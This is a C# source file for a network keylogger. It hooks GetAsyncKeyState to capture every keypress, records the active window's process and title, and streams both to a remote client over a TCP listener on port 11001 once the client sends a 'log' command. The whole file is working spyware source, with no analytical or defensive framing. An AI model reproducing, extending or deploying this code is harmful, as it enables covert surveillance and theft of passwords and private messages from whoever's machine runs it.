using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;

namespace ServerKey
{
    public class Server
    {
        public bool blLog = false;
        public string data = null;
        public string strEOL = "H(#HRJ(DOE#";
        public string strProcessOpen = "Desktop";
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        private static extern Int16 GetAsyncKeyState(int vkey);
        public string listenKeys()
        {
            string strText="";
            for (int i = 0; i < 255; i++)
            {

                if (GetAsyncKeyState(i) == -32767)
                    strText += ((char) i).ToString();
            }
            return strText;
        }
        public void startLog(Socket handler)
        {
            handler.ReceiveTimeout = 100;

            while (true)
            {

                byte[] bytes;
                string message="";
                data = "";


                while (true)
                {
                    bytes = new byte[204800];
                    try
                    {
                        int bytesRec = handler.Receive(bytes);
                        message = Encoding.ASCII.GetString(bytes, 0, bytesRec);
                        if (message.IndexOf(strEOL) > -1)
                        {
                            break;
                        }
                        
                        
                    }

                    catch (Exception e)
                    {
                        Console.WriteLine("No respond ..., Responding");

                    }
                    
                    if (strProcessOpen != GetActiveProcess())
                    {
                        strProcessOpen = GetActiveProcess();
                        data += strProcessOpen+"\r\n";
                    }

                    data += listenKeys();
                    byte[] msg = Encoding.ASCII.GetBytes(data);

                    try
                    {
                        handler.Send(msg);
                    }
                    catch
                    { return; }
                    if (message == "No" + strEOL)
                        return;
                    data = "";

                }

            }
        }
        public string GetActiveProcess()
        {
            Process[] PcsProcessList = Process.GetProcesses();
            for (int i = 0; i < PcsProcessList.Length; i++)
            {
                if (PcsProcessList[i].MainWindowHandle == GetForegroundWindow())
                {   
                    if(PcsProcessList[i].MainWindowTitle=="")
                        return PcsProcessList[i].ProcessName+" [startMenu]";
                    return PcsProcessList[i].ProcessName + " [ " + PcsProcessList[i].MainWindowTitle + " ]";
                }
            }
            return "[desktop]";
        }

        public void StartListening()
        {
            byte[] bytes = new Byte[1024];

            IPHostEntry ipHostInfo = Dns.Resolve(Dns.GetHostName());
            IPAddress ipAddress = ipHostInfo.AddressList[0];
            IPEndPoint localEndPoint = new IPEndPoint(IPAddress.Parse("192.168.0.101"), 11001);

            Socket listener = new Socket(AddressFamily.InterNetwork,
                SocketType.Stream, ProtocolType.Tcp);
    //       try
  //  {
                listener.Bind(localEndPoint);
                listener.Listen(10);

                while (true)
                {
                    Console.WriteLine("Waiting for a connection...");
                    Socket handler = listener.Accept();
                    data = null;

                    while (true)
                    {
                        bytes = new byte[1024];
                        int bytesRec = handler.Receive(bytes);
                        data += Encoding.ASCII.GetString(bytes, 0, bytesRec);
                        if (data.IndexOf(strEOL) > -1)
                        {
                            break;
                        }
                    }
                    byte[] msg;
                    Console.WriteLine("Text received : {0}", data);
                    if (data == "log" + strEOL)
                    {
                        msg = Encoding.ASCII.GetBytes("Going to Log Mode");
                        blLog = true;
                    }
                    else
                        msg = Encoding.ASCII.GetBytes(data.ToUpper());
                    handler.Send(msg);
                    if (blLog)
                        startLog(handler);

                    blLog = false;
                    handler.Shutdown(SocketShutdown.Both);
                    handler.Close();
                }

       //  }
  /*       catch (Exception e)
            {
                Console.WriteLine(e.ToString());

            }*/
        }
    }
}
